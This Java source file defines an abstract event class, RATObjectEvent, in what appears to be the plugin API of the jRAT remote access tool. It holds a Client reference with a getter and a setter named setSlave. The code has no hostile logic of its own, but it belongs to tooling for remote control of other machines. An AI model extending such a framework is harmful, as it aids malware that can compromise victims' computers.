package jrat.api.events;

import jrat.api.Client;

public abstract class RATObjectEvent implements AbstractEvent {

	private Client server;

	public RATObjectEvent(Client server) {
		this.server = server;
	}

	public Client getServer() {
		return server;
	}

	public void setSlave(Client server) {
		this.server = server;
	}

}
